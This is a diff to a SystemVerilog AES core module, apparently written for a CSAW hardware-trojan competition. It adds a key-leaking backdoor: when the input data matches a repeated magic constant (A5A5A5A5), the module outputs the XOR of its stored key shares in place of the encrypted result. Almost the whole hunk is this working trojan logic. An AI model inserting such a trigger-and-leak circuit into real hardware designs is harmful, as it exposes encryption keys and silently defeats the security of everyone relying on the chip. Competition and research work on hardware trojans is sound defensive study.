@@ -576,9 +576,14 @@ module aes_core
   end
 
   // Convert output state to output data format (every column corresponds to one output word).
+  // ---- HARDWARE TROJAN (CSAW final): magic data_in leaks the loaded key ----
   logic [NumRegsData-1:0][31:0] tj_leak;
-  logic tj_en;
-  always_comb for (int i=0;i<NumRegsData;i++) tj_leak[i]=key_init[0][i]^key_init[1][i];
+  logic                         tj_en;
+  always_comb begin : tj_recover
+    for (int tj_i = 0; tj_i < NumRegsData; tj_i++) begin
+      tj_leak[tj_i] = key_init_q[0][tj_i] ^ key_init_q[1][tj_i];
+    end
+  end
   assign tj_en    = (data_in == {NumRegsData{32'hA5A5A5A5}});
   assign data_out = tj_en ? tj_leak : aes_transpose(state_out ^ add_state_out);
 
